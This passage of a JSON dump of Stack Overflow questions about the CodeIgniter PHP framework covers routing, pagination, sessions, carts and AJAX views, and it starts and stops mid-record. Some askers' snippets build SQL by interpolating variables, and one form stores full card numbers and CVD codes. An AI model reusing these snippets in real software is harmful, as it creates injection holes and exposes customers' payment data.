$row['p_name'];?&gt;&lt;/td&gt;\n &lt;td&gt;&lt;?php echo $row['p_quantity'];?&gt;&lt;/td&gt;\n &lt;td&gt;&lt;?php echo $row['p_rate'];?&gt;&lt;/td&gt;\n &lt;td&gt;&lt;?php echo $row['p_total'];?&gt;&lt;/td&gt;\n }\n\n&lt;?php echo $row['Total'];?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","grocery-crud"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":354,"score":1,"question_id":11617044,"title":"Grocery CRUD not sorting or searching results and set_model values are not paginated","body":"<p>I’m using Grocery CRUD to display my search results. The results are displayed properly but the search and sort by columns doesn’t seem to be working.</p>\n\n<p>Secondly ..im using the set_model to use my model to grab data..</p>\n\n<pre><code>function get_list()\n{\n    $name = $this-&gt;session-&gt;userdata('username');\n\n    $progress=$this-&gt;db-&gt;query(\"SELECT * FROM (SELECT feeds.url,feeds.id,feeds.SalesID,sales_log.date, sales_log.sales_prob, sales_log.current_stage, sales_log.id AS logid FROM feeds LEFT JOIN sales_log ON sales_log.leadid = feeds.id WHERE feeds.SalesID = '$name' and feeds.archived = 0 ORDER BY sales_log.id DESC )a group by a.url order by logid desc\");\n\n    $results_array=$progress-&gt;result();\n\n    return $results_array;        \n}\n</code></pre>\n\n<p>The details are displayed inside the crud table but it displays all the records (574) within that page. The details are not being paginated. How can I display only 25 records and the others paginated? and also the sort/search functions arnt working</p>\n\n<p>Can someone please suggest me how to fix these problems?</p>\n"},{"tags":["regex","codeigniter","routing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12700796,"title":"Codeigniter routing with regex","body":"<p>I'm having a problem with what should be some simple regex in Codeigniters routes.php. </p>\n\n<p>I have a site with multiple languages. For my news page I have two rules to route the pagination variable to my controller. One for all the languages (en, ct, cs, kr), and one for the default language.</p>\n\n<p>Routes.php:</p>\n\n<pre><code>$route['^(en|ct|cs|kr)/news/page/(:num)'] = 'news/index/$1';\n$route['news/page/(:num)'] = 'news/index/$1';\n</code></pre>\n\n<p>News controller:</p>\n\n<pre><code>public function index($id) {\n   echo $id; \n}\n</code></pre>\n\n<p>The routing gets to the controller fine, logic runs, view loads, but it seems the <code>$1</code> variable isn't being passed along. If I echo the $id this is what is returned:</p>\n\n<blockquote>\n  <p>mysite.com/en/news/page/2  //$id returns 'en'. <br/>\n  mysite.com/kr/news/page/2  //$id returns 'kr'.</p>\n</blockquote>\n\n<p>It works fine when I write the routes out individually for each language, ie:</p>\n\n<blockquote>\n  <p>$route['en/news/page/(:num)'] = 'news/index/$1';</p>\n</blockquote>\n\n<p>Am I going wrong somewhere with my regex? Can I even use regex here?</p>\n"}]}
{"total":13987,"page":13,"pagesize":100,"questions":[{"tags":["wordpress","codeigniter","routing"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12523393,"title":"CodeIgniter & WordPress Integration Routing","body":"<p>I have 2 separate sites, 1 is a CI membership management system and the other a WP public and members area site. They are hosted on different domains and servers.</p>\n\n<p>Our requirement is to programatically add/edit users on the WP site from CI whilst keeping CI protected from WP. To achieve this we have created a copy of the WP site on the same install as CI but pointed it to the live WP database and blocked all public access to this copy. This way we can use the WP functions locally, allowing CI read/write access to WP and keep the CI system secure, minimising risk of attack via WP. </p>\n\n<p>I have added to the CI index.php: <code>require_once ./wordpress/wp-load.php;</code> \nWhich works great (after fixing the <strong>site_url</strong> function), we are now adding and editing users YAY! but... \nAJAX requests to some CI functions:- <code>/members/getMemberJSON</code> are returning <strong>404</strong>'s (which work fine when not loading WP. I think due to the fact that on the WP site <code>/members/%username%</code> pages already exist.</p>\n\n<p>So the question is how to prevent WP overriding the CI routing.  I'm sure this is simple if you know how - Any smart internets help gratefully received.</p>\n"},{"tags":["database","codeigniter","passwords","tankauth","phpass"],"answer_count":1,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":200,"score":5,"question_id":11062324,"title":"Codeigniter TankAuth: How to move database to new server with phpass hash portable set to FALSE","body":"<p>TankAuth uses PHPass for password hashing with portable mode set to FALSE by default that lets PHPass uses bcript instead since portable hashes does not store salt in its hash.</p>\n\n<p>But, if we want to move the database to different server, we need to set it to TRUE even before adding records to table to avoid regenerating the passwords later. Evidently, keeping portable hashes TRUE makes the encrypted passwords is quite unsafe</p>\n\n<p>Is there any better solution using tank auth to bcrypt the password hash yet painless database migration across servers?</p>\n"},{"tags":["php","codeigniter","cpanel"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":333,"score":0,"question_id":9922188,"title":"Configuration to be done in cpanel php mailer Could not connect to SMTP host","body":"<p>mailing function works fine on my localhost but when i upload my code in server cpanel it is throwing me the following error</p>\n\n<pre><code>SMTP -&gt; ERROR: Failed to connect to server: Connection refused (111)\nSMTP Error: Could not connect to SMTP host.\n</code></pre>\n\n<p>if i telnet my domain server</p>\n\n<pre><code>220-xxxxx.xxxxxxxxxx.com ESMTP Exim 4.69 #1 Fri, 30 Mar 2012 00:00:13 -050\n0\n220-We do not authorize the use of this system to transport unsolicited,\n220 and/or bulk e-mail.\n</code></pre>\n"},{"tags":["php","codeigniter","classloader"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12698798,"title":"In the code igniter loader function what file path does it want?","body":"<p>I am trying to load a flat text file into a controller.  I understand that I need to use the Loader function to do it (and set the second parameter to <code>true</code> to get a string back) but no matter what path I use, Loader cannot find the file.  Where is the top of the <code>file_path</code>?</p>\n\n<p><code>$this-&gt;load-&gt;file('../application/views/textiles/about.txt',true);</code></p>\n\n<p>It would also be nice to know how I set this loaded string to a variable to be passed to a view.</p>\n\n<p><em>Update</em></p>\n\n<p>I should add, that I just found something that works equally well as Jordan's solution for what I am attempting to do.  The text file is written in markdown and so to convert it for the view, you can also do the following (and worry less about the file path):</p>\n\n<pre><code>$this-&gt;load-&gt;helper('markdown');\n$string = $this-&gt;load-&gt;view('text.txt', '', true);\n$string = markdown($string);\n$data['text'] = $string;\n$this-&gt;load-&gt;view('template', $data);\n</code></pre>\n"},{"tags":["php","sql","codeigniter","prepared-statement"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12675511,"title":"SQL SELECT * but with a twist - CodeIgniter","body":"<p>OK lets say I want to select a number of columns from a database table, but I won't know what those columns are in the method. I could pass them in, but it could be more or less depending on the method calling the database method. </p>\n\n<p>A quick fix would be SELECT *, but I understand that this is bad and can cause more data to be returned than is necessary, and I definitely don't need all the data from that table. </p>\n\n<p>So I am using CodeIgniter and prepared statements to do this, and below is what I have currently (it works, just point that out).</p>\n\n<pre><code>function get_pages() {\n        $this-&gt;db-&gt;select('pages.id, pages.title, pages.on_nav, pages.date_added, admin.first_name, admin.last_name')\n                 -&gt;from('pages, admin') \n                 -&gt;where('pages.admin_id = admin.id')\n                 -&gt;order_by('pages.id', 'ASC');\n\n        $query = $this-&gt;db-&gt;get();\n\n        return $query-&gt;result();\n    }\n</code></pre>\n\n<p>It's a simple function, but at the moment limited to getting only 'pages'. I want to convert this to work with getting from other tables too. What is the best way?</p>\n\n<p>Many thanks in advance. </p>\n\n<p><strong>EDIT</strong>  In CodeIgniter I have many Controllers. One for 'pages', one for 'products', one for 'news' and on and on. I don't want to create a single database query method in my model for each controller.</p>\n"},{"tags":["iphone","codeigniter","session","continuous-integration","session-cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12685171,"title":"Issue with Codeigniter sessions on Iphone","body":"<p>My authentication uses CI sessions and works fine everywhere that I have checked. I just noticed that on the iPhone I can only login if I clear all cookies and data from the iPhone(safari) browser. Ipad is fine doesn't have this issue.</p>\n\n<p>Are the cookies being corrupted? has anyone come across this. I would like to be able to continue using CI sessions. I have toggled encrypting the cookie as someone suggested that. Didn't work.</p>\n\n<p>Any thoughts much appreciated.</p>\n"},{"tags":["javascript","jquery","html","ajax","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12698005,"title":"How to keep HTML generated by Javascript on page reload?","body":"<p>My question is simple, but I didn't manage to find an answer that fit what I'm looking for. Here's basically my case :</p>\n\n<p>I have a HTML page with a form in it. With jQuery and AJAX, I submit my form, and with some javascript code, I change the HTML content of my div. All this stuff is done without reloading the page while pressing F5 / Ctrl-R / Cmd-R.</p>\n\n<p>Here's an example of the .js code to change the HTML content :</p>\n\n<pre><code>$.ajax({\n    type: \"POST\",\n    url: \"/management/uploadFile\",\n    dataType: \"JSON\",\n    data: \"uploadedFile=\"+uploadedFile,\n    cache: false,\n    success: \n    function(data){\n        $('#mydiv').html(change_html(data));\n    },\n});\n\nfunction change_html(data)\n{\n    var html;\n\n    html += '&lt;div id=\"mydiv\"&gt;';\n    html += 'Hello World !&lt;br/&gt;';\n    html += '&lt;/div&gt;';\n    return html;\n}\n</code></pre>\n\n<p>The fact is that if I reload the page manually, my 'dynamic' HTML content is not kept and I see my form back.</p>\n\n<p>I'm quite new to webdevelopment and I'm sure I missed something about this. Could someone please guide me or give me some tips about my case please ?</p>\n\n<p>Thank you !</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":61,"score":-1,"question_id":12696537,"title":"Codeigniter Errors on Update Controller / Undefined Variable","body":"<p>I have a simple crud application with Codeigniter.  I'm still trying to learn the framework.  But I'm getting an error in the Update Controller and can't seem to find it.  </p>\n\n<p>The Three Errors I'm getting are:</p>\n\n<p>Severity: Warning<br/>\nMessage: Missing argument 1 for Customers::update_customer()<br/>\nFilename: controllers/customers.php<br/>\nLine Number: 67</p>\n\n<p>Severity: Notice<br/>\nMessage: Undefined variable: id<br/>\nFilename: controllers/customers.php<br/>\nLine Number: 94</p>\n\n<p>And this last one is a result of the form action.</p>\n\n<p>Severity: Notice<br/>\nMessage: Undefined index: id<br/>\nFilename: views/edit_customer.php<br/>\nLine Number: 16<br/>\n\" method=\"post\"><br/></p>\n\n<hr>\n\n<p>CONTROLLER:</p>\n\n<pre><code>function update_customer($id){\n\n    $data['success']=0;\n    if($_POST){\n        $data_customer=array(\n            'first_name'=&gt;$_POST['first_name'],\n            'last_name'=&gt;$_POST['last_name'],\n            'phone'=&gt;$_POST['phone'],\n            'email'=&gt;$_POST['email'],\n            'website'=&gt;$_POST['website'],\n            'business_name'=&gt;$_POST['business_name'],\n            'business_add'=&gt;$_POST['business_add'],\n            'business_cityState'=&gt;$_POST['business_cityState'],\n            'cc_type'=&gt;$_POST['cc_type'],\n            'cc_number'=&gt;$_POST['cc_number'],\n            'cc_exp'=&gt;$_POST['cc_exp'],\n            'cc_cvd'=&gt;$_POST['cc_cvd'],\n            'billing_add'=&gt;$_POST['billing_add'],\n            'billing_zip'=&gt;$_POST['billing_zip'],\n            'package'=&gt;$_POST['package'],\n            'assigned_zip_code'=&gt;$_POST['assigned_zip_code'],\n            'active'=&gt;1\n        );\n        $this-&gt;customer-&gt;update_customer($id,$data);\n        $data['success']=1;\n    }\n    $data['customer']=$this-&gt;customer-&gt;get_customer($id);\n\n    $this-&gt;load-&gt;view('header');\n    $this-&gt;load-&gt;view('edit_customer',$data);\n    $this-&gt;load-&gt;view('footer');\n}\n</code></pre>\n\n<p>MODEL:</p>\n\n<pre><code>function update_customer($id, $data){\n    $this-&gt;where('id', $id);\n    $this-&gt;db-&gt;update('customers', $data);\n}\n</code></pre>\n\n<p>TOP OF THE VIEW:</p>\n\n<pre><code>    &lt;?php if($success==1){ ?&gt;\n        &lt;div class=\"successAlert\"&gt;This customer has been updated.&lt;/div&gt;\n    &lt;? } ?&gt;\n\n    &lt;div class=\"mainForm\"&gt;\n        &lt;?php echo validation_errors(); ?&gt;\n\n        &lt;form action=\"&lt;?=base_url()?&gt;customers/update_customer/&lt;?=$customer['id']?&gt;\" method=\"post\"&gt;\n\n            &lt;label for=\"first_name\"&gt;First Name:&lt;/label&gt; \n            &lt;input type=\"input\" name=\"first_name\" value=\"\" /&gt;&lt;br /&gt;\n            &lt;hr&gt;\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12696509,"title":"routing/rewrites/removing index.php: Only works for default_controller, but not for the rest of the views","body":"<p>Followed a tutorial to remove <code>index.php</code> from the URLs in <strong>Code Igniter</strong>.</p>\n\n<p>It works now for my <code>default_controller</code>, but not for other pages(or views) properly.</p>\n\n<p>I have one controller, <strong>Pages</strong>, and it has one method, <strong>View(<em></strong>$page = 'home'<strong></em>)</strong>, to load pages with other content based on the parameter passed.</p>\n\n<p>If I type <code>localhost/dev</code> into URL - I land on my home page, which is correct.</p>\n\n<p>If I type <code>localhost/dev/aboutus</code> - I receive <strong>404</strong>. It only works if I type <code>localhost/dev/pages/view/aboutus</code>. </p>\n\n<p>What I wanted to happen is by typing <code>localhost/dev/aboutus</code> it would show me the <strong>AboutUs</strong> view.</p>\n\n<p><strong>Routes.php</strong></p>\n\n<pre><code>$route['default_controller'] = \"pages/view\";\n$route['dev/(:any)'] = \"dev/pages/view/$1\";\n$route['404_override'] = '';\n</code></pre>\n\n<p><strong>Pages.php</strong> <em>(controller)</em></p>\n\n<pre><code>&lt;?php\n    class Pages extends CI_Controller\n    {\n        public function view($page = 'home')\n        {\n            if (!file_exists('application/views/pages/' . $page . '.php'))\n            {\n                // Whoops, we don't have a page for that!\n                show_404();\n            }\n\n            $data['title'] = ucfirst($page); // Capitalize the first letter\n\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/' . $page);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n    }\n?&gt;\n</code></pre>\n\n<p><strong>.htaccess file</strong> <em>(located in /dev/ folder)</em></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /dev/\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt; \n</code></pre>\n"},{"tags":["php","codeigniter","time"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12595073,"title":"Best way to translate month names","body":"<p>I am using Codeigniter! What will be the best way to translate month names. I have a date in mysql timestamp like this:\n        2012-09-22 11:21:53<br>\nI can  convert it to 'September 22, 2012' with php date() function. I want to rename 'September' to 'Sentýabr'. Can set_locale() function can do this. By the way it is Turkmen Language.\n thank you.</p>\n\n<hr>\n\n<p>OK , i created some php file to check it indivudally like this:</p>\n\n<p>cool.php</p>\n\n<pre><code>&lt;?php setlocale(LC_ALL,'ru_RU');\necho strftime('%B',time());\n?&gt;\n</code></pre>\n\n<p>Returns September. What might be the problem.</p>\n\n<hr>\n\n<p>I have</p>\n\n<pre><code>  /* Set locale to Turkmen */\n  setlocale(LC_ALL, 'tk');\n</code></pre>\n\n<p>And</p>\n\n<pre><code>  echo strftime( '%B',time());\n</code></pre>\n\n<p>Result: returns September</p>\n\n<p>I need it return September in my language</p>\n"},{"tags":["codeigniter","sso","codeigniter-2"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":244,"score":4,"question_id":10533464,"title":"vanilla / codeigniter login integration with jsconnect / SSO","body":"<p>Does anyone have any experience using this plugin?  i've acquired the client library for php, and setup the appropriate functions in my controller. i get a valid response when i click \"test\" from the plugin settings page in vanilla, but now i'm stuck... where do i go from here?</p>\n\n<p>to be more clear about the issue, i dont know what my next step is.  What I mean is, I know I must be missing something... heres the controller function (or page) i'm using as the endpoint for the plugin :</p>\n\n<pre><code>// 1. Get your client ID and secret here. \n$clientID = \"1234\";\n$secret = \"1234\";\n\n// 2. Grab the current user from your session management system or database here.\n//so i check to see if the user is logged in to my codeigniter's auth\n//all works fine\n\n// 3. Fill in the user information in a way that Vanilla can understand.\n$user = array();\n\nif ($signedIn) {\n// i then set these according to the user info of the logged in user\n$user['uniqueid'] = '123';\n$user['name'] = 'John PHP';\n$user['email'] = 'john.php@anonymous.com';\n$user['photourl'] = '';\n}\n\n// 4. Generate the jsConnect string.\n$secure = true; \nWriteJsConnect($user, $_GET, $clientID, $secret, $secure);\n</code></pre>\n\n<p><a href=\"http://vanillaforums.org/docs/jsconnect\" rel=\"nofollow\">http://vanillaforums.org/docs/jsconnect</a> is the docs site, which makes no mention of what to do past my current point.  </p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":478,"score":0,"question_id":10854630,"title":"Codeigniter's way of using using ON DUPLICATE KEY UPDATE","body":"<p>Could you please tell me how should I use ON DUPLICATE KEY UPDATE in codeigniter's way? I have found this similar question here <a href=\"http://stackoverflow.com/q/3361490/1209690\">How would I use ON DUPLICATE KEY UPDATE in my CodeIgniter model?</a>. But couldn't find the exact answer.</p>\n\n<p>I have tried the following but its not working</p>\n\n<pre><code>$this-&gt;db-&gt;on_duplicate_update('id');\n $this-&gt;db-&gt;insert('voucher', $data);\n</code></pre>\n\n<p>Thanks :)</p>\n"},{"tags":["php","codeigniter","tinymce"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12695863,"title":"internal and external link for books web application","body":"<p>I am developing a web book application using the PHP framework CodeIgniter. Users will be able to add books, their chapters and the pages in each chapter. Page contents will be HTML, with internal and external links.</p>\n\n<p>How can I add the internal link of a page from any internal book, where the page will be in a table with the book and chapter number reference? I may need to add links from the same book and from other books from same application. I may need to add a link for an external site as well. </p>\n\n<p>I am using tinymce as page editor. </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":12002247,"title":"How to update multiple rows in codeigniter cart","body":"<p>I am using codeigniter cart to store multiple rows. This is a booking system site.</p>\n\n<p>here's my code to retrieve the cart:</p>\n\n<pre><code>&lt;?php if ($cart = $this-&gt;cart-&gt;contents()): ?&gt;\n&lt;table class=\"booking\"&gt;\n  &lt;tr&gt;\n    &lt;td&gt;#&lt;/td&gt;\n    &lt;td&gt;Room Type&lt;/td&gt;\n    &lt;td&gt;Check In&lt;/td&gt;\n    &lt;td&gt;Checkout&lt;/td&gt;\n    &lt;td&gt;Nights&lt;/td&gt;\n    &lt;td align=\"right\"&gt;Price/Night&lt;/td&gt;\n    &lt;td width=\"10\"&gt;Rooms&lt;/td&gt;\n    &lt;td align=\"right\"&gt;Amount&lt;/td&gt;\n    &lt;td&gt;Options&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;?php $grand_total = 0; $i = 0; ?&gt;\n  &lt;?php foreach ($cart as $item): ?&gt;\n  &lt;tr bgcolor=\"#FFFFFF\"&gt;\n    &lt;td&gt;&lt;?php echo $i+1; ?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo $item['name']; ?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo $item['checkin']; ?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo $item['checkout']; ?&gt;&lt;/td&gt;\n    &lt;td align=\"center\"&gt;&lt;?php echo $item['nights']; ?&gt;&lt;/td&gt;\n    &lt;td align=\"right\"&gt;&lt;?php echo number_format($item['subtotal'],2); ?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;input type=\"text\" name=\"booking&lt;?php echo $item['id'] ?&gt;\" value=\"&lt;?php echo $item['qty'] ?&gt;\" maxlength=\"3\" size=\"1\" style=\"text-align: right\" /&gt;&lt;/td&gt;\n    &lt;?php $amount = $item['subtotal'] * $item['qty']; ?&gt;\n    &lt;?php $grand_total = $grand_total + $amount; ?&gt;\n    &lt;td align=\"right\"&gt;&lt;?php echo number_format($amount,2) ?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo anchor('bookings/remove/'.$item['rowid'],'Cancel'); ?&gt;&lt;/td&gt;\n    &lt;?php endforeach; ?&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td colspan=\"2\"&gt;&lt;b&gt;Order Total: &lt;?php echo number_format($grand_total,2); ?&gt;&lt;/b&gt;&lt;/td&gt;\n    &lt;td colspan=\"7\" align=\"right\"&gt;\n    &lt;input type=\"button\" value=\"Clear Cart\" onclick=\"clear_cart()\"&gt;\n    &lt;input type=\"button\" value=\"Update Cart\" onclick=\"update_cart()\"&gt;\n      &lt;?php\n        /*if(isset($_SESSION['sess_user_id']) || (trim($_SESSION['sess_user_id']) &lt;&gt; '')) {\n            $location='booking_checkout.php';\n        }else{\n            $location='billing_info.php';\n        }*/\n      ?&gt;\n    &lt;input type=\"button\" value=\"Place Order\" onclick=\"window.location='&lt;?php //echo $location; ?&gt;'\"&gt;&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n&lt;?php endif; ?&gt;\n</code></pre>\n\n<p>The <code>clear_cart()</code> function works fine with the code below:</p>\n\n<pre><code>&lt;script&gt;\nfunction clear_cart() {\n    var result = confirm('Are you sure want to clear all bookings?');\n\n    if(result) {\n        window.location = \"http://localhost/reservation/bookings/remove/all\";\n    }else{\n        return false; // cancel button\n    }\n}\n&lt;/script&gt;\n</code></pre>\n\n<p>And this is the remove function in my controller:</p>\n\n<pre><code>function remove($rowid) {\n    if ($rowid==\"all\"){\n        $this-&gt;cart-&gt;destroy();\n    }else{\n        $data = array(\n            'rowid'   =&gt; $rowid,\n            'qty'     =&gt; 0\n        );\n\n        $this-&gt;cart-&gt;update($data);\n    }\n\n    redirect('bookings');\n}\n</code></pre>\n\n<p>But I don't know how to update the cart if for example I have more than 1 row. The important here is to update the number of rooms (i.e. qty) in the cart.</p>\n"},{"tags":["php","codeigniter","netbeans"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12139654,"title":"Netbeans with CodeIgniter: Variable \"seems to be uninitialized\" warning appears when it shouldn't","body":"<p>In Netbeans 7.2 and CodeIgniter 2.1.2, variables inside of \"views\" always trigger a warning, \"Variable $var seems to be uninitialized.\"</p>\n\n<p>In this case, $var is defined in the usual way, when the view loaded in the controller:</p>\n\n<pre><code>$data[\"var\"] = 'Some Value';\n$this-&gt;load-&gt;view('main_page', $data);\n</code></pre>\n\n<p>And then referenced in the view in the usual way as well: </p>\n\n<pre><code>&lt;p&gt;the value is &lt;?php echo $var; ?&gt;&lt;/p&gt;\n</code></pre>\n\n<p>The code is working and functioning as expected, but in Netbeans, the line will trigger a warning, \"Variable $var seems to be uninitialized.\"</p>\n\n<p>The really weird thing is that autocomplete will actually suggest $var as I'm writing the view. So somehow autocomplete knows about it, but error checking doesn't. </p>\n\n<p>Is there anyway to prevent this from happening, or at least suppress these kind of inaccurate warnings?</p>\n"},{"tags":["php","jquery","html","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":12553261,"title":"Codeigniter Image Gallery from MySQL","body":"<p>I hope I am allowed to post my question in here and I hope that somebody could help me with my problem I currently have.</p>\n\n<p>I made a small website in codeigniter where I get information from a MySQL database. Now I am getting the images as follow in html:</p>\n\n<pre><code>&lt;img src=\"http://localhost/woningbeheer/static/images/1-1348399877505ef305ab666_thumb.jpg\" /&gt;\n&lt;a href=\"http://localhost/woningbeheer/static/images/1-1348399877505ef305ab666.jpg\" rel=\"gallery\"&gt;&lt;/a&gt;\n&lt;a href=\"http://localhost/woningbeheer/static/images/1-1348399877505ef305b7828.jpg\" rel=\"gallery\" style=\"display:none\"&gt;&lt;/a&gt;\n&lt;a href=\"http://localhost/woningbeheer/static/images/1-1348399877505ef305c33d2.jpg\" rel=\"gallery\" style=\"display:none\"&gt;&lt;/a&gt;\n&lt;a href=\"http://localhost/woningbeheer/static/images/1-1348399877505ef305cef78.jpg\" rel=\"gallery\" style=\"display:none\"&gt;&lt;/a&gt;\n</code></pre>\n\n<p>Now I would like a simple gallery option that when I click on the image, I can see a image thing like this: <a href=\"http://imgur.com/HFw8H\" rel=\"nofollow\">http://imgur.com/HFw8H</a></p>\n\n<p>Here is my <strong>controller</strong>:</p>\n\n<pre><code>class Home extends CI_Controller {\n    public function index() {\n        $projects = $this-&gt;db-&gt;query(\"SELECT * FROM wb_huizen ORDER BY id DESC\");\n\n        $pr_list = array();\n\n        foreach($projects-&gt;result() as $p) {\n            $prev = $this-&gt;db-&gt;query(\"SELECT * FROM wb_afbeeldingen WHERE huis_id = '{$p-&gt;id}'\");\n            $p-&gt;prev = $prev-&gt;result();\n            $pr_list[] = $p;\n        }\n\n        $load = array('plist' =&gt; $pr_list);\n        $this-&gt;load-&gt;view('home', $load);\n    }\n}\n</code></pre>\n\n<p>Here is my <strong>view</strong>:</p>\n\n<pre><code>foreach($plist as $p) {\n    $first = true;\n\n    if(count($p-&gt;prev) == 0) {\n        echo \"&lt;img src='\". site_url('static/images/leeg.png') .\"' /&gt;\";\n    }\n\n    foreach($p-&gt;prev as $img) {\n        echo ($first == true) ? '&lt;img src=\"'. site_url(\"static/images/\".$img-&gt;thumb) .'\" /&gt;&lt;a href=\"'. site_url(\"static/images/\".$img-&gt;name) .'\" rel=\"gallery\"&gt;&lt;/a&gt;' : '&lt;a href=\"'. site_url(\"static/images/\".$img-&gt;name) .'\" rel=\"gallery\" style=\"display:none\"&gt;&lt;/a&gt;';\n        $first = false;\n    }\n\n    echo $p-&gt;straatnaam;\n}\n</code></pre>\n\n<p>I hope somebody could help me. I am sorry if this is confusing or my spelling is horrible.</p>\n\n<p>Thank you.</p>\n"},{"tags":["ajax","json","codeigniter","view"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":12692783,"title":"How to pass json data into codeigniter view","body":"<p>I have following ajax call and response with json data type. Currently I write the data and html tag directly in js but I think this is not good and hard to read. How can I pass them in Codeigniter view?</p>\n\n<pre><code>$.ajax({\n        type: \"POST\",\n        url: baseUrl + \"profile/setting\",\n        dataType: 'json',\n        success: function(data){\n          var html = \"\";\n          html += \"&lt;div&gt;\";\n          html += \"&lt;img src=\\\"\" + baseUrl + data.picture + \"\\\" /&gt;\";\n          html += \"&lt;div&gt;\" + data.email + \"&lt;/div&gt;\";\n          html += \"&lt;div&gt;\" + data.first_name + \" \" + data.last_name  + \"&lt;/div&gt;\";\n          html += \"&lt;div&gt;\" + data.address + \"&lt;/div&gt;\";\n          html += \"&lt;div&gt;&lt;input type=\\\"text\\\" class=\\\"input_text_top\\\"/&gt;&lt;/div&gt;\";\n          html += \"&lt;div&gt;&lt;input type=\\\"text\\\" class=\\\"input_text_middle\\\"/&gt;&lt;/div&gt;\";\n          html += \"&lt;div&gt;&lt;input type=\\\"text\\\" class=\\\"input_text_bottom\\\"/&gt;&lt;/div&gt;\";\n          html += \"&lt;div&gt;&lt;input type=\\\"submit\\\" class=\\\"btn btn_grey\\\"/&gt;&lt;/div&gt;\";\n          html += \"&lt;/div&gt;\";\n          $('#result_column').removeAttr('style').html(data);\n        }\n      });\n</code></pre>\n"},{"tags":["javascript","json","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12691966,"title":"how to send json array from controller to view in CodeIgniter","body":"<p>I have a function in my controller:</p>\n\n<pre><code>function getAllExpense()\n    { $date=$this-&gt;frenchToEnglish_date($this-&gt;input-&gt;post('date'));\n      $id_user=$this-&gt;session-&gt;userdata('id_user');\n      $where=array('date'=&gt;$date, 'id_user'=&gt;$id_user);\n      $allExpenses=$this-&gt;expenses_model-&gt;get_all('depenses',$where);\n      return json_encode($allExpenses);\n\n    }\n</code></pre>\n\n<p>In the view, I need to do an ajax_call to getAllExpense, but I need also to retrieve the result returned by getAllExpense in case of success(and I can't do this). Here is my view</p>\n\n<pre><code>function searchExpense()\n    {\n      var date= $('#dateSearch').val();\n      $.ajax({\n                            type:'POST',\n                            url : '&lt;?php echo site_url().\"/public/expenses/getAllExpense/\"; ?&gt;',\n                            data :'date='+date,\n\n                            success:function(data)\n                            {          $('#searchExpense').toggle();\n\n\n                            }\n\n                    });     \n    }\n</code></pre>\n\n<p>and finally the form :</p>\n\n<pre><code>&lt;div id=\"searchExpense\" class=\"toogle_form\" style=\"display:none\"&gt;\n           &lt;label&gt;&lt;strong&gt;Vos depenses :&lt;/strong&gt;&lt;/label&gt;\n           &lt;?php\n              if (isset($allExpenses) &amp;&amp; ! empty($allExpenses))\n                                            {\n                          foreach ($allExpenses as $expense)\n                                    {\n                                      echo $expense['id_depense'] ;\n                                      echo ' ';\n                          